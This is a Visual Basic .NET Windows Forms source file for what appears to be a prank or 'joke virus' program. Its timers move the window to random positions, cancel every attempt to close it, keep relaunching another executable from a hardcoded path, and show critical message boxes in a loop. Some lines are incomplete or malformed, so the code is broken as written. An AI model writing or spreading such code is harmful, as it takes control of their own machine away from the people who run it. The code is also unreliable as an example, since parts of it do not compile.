Imports System
Imports Microsoft.VisualBasic
Imports System.Random
Imports System.IO

Public Class Form1

    Dim R As New Random
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Start()
        Timer5.Start()
        Dim computer As New Microsoft.VisualBasic.
    End Sub

    Private Sub Timer5_Tick(sender As Object, e As EventArgs) Handles Timer5.Tick
        Timer5.Stop()
        Timer5.Enabled = False
        Timer2.Start()
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        If DesktopLocation = New Point(R.Next(1, 1000), R.Next(1, 500)) Then
            DesktopLocation = New Point(R.Next(1, 1000), R.Next(1, 500))
        Else
            DesktopLocation = New Point(R.Next(1, 1000), R.Next(1, 500))
        End If
    End Sub

    Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs) Handles MyBase.FormClosing
        e.Cancel = True
        MsgBox("ニャンパス", MsgBoxStyle.Critical, "пухкі")
    End Sub

    Private Sub Timer2_Tick(sender As Object, e As EventArgs) Handles Timer2.Tick
        Process.Start("C:\Program Files (x86)\bramerto-rob\Marb\bin\Debug\net5.0-windows\Marb.exe")'C:\Program Files (x86)\bramerto-robber\Marb\bin\Debug\net5.0-windows\Marb.exe'
        Timer3.Start()
    End Sub

    Private Sub Timer3_Tick(sender As Object, e As EventArgs) Handles Timer3.Tick
        Timer3.Stop()
        Timer3.Enabled = False
        Timer4.Start()
    End Sub

    Private Sub Timer4_Tick(sender As Object, e As EventArgs) Handles Timer4.Tick
        MsgBox("ニャンパス", MsgBoxStyle.Critical, "пухкі")
        MsgBox()
    End Sub
End Class